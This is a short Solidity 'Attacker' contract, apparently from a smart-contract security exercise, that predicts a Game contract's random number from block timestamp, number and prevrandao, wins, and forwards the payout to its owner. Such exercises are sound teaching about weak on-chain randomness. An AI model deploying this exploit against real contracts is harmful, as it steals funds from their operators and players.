// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Game} from "./Game.sol";

contract Attacker {
    Game game;
    address owner;

    constructor(address _gameAddress) {
        game = Game(_gameAddress);
        owner = msg.sender;
    }

    function attack() external {
        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.prevrandao)));
        game.play(number);
    }

    receive() external payable {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }
}
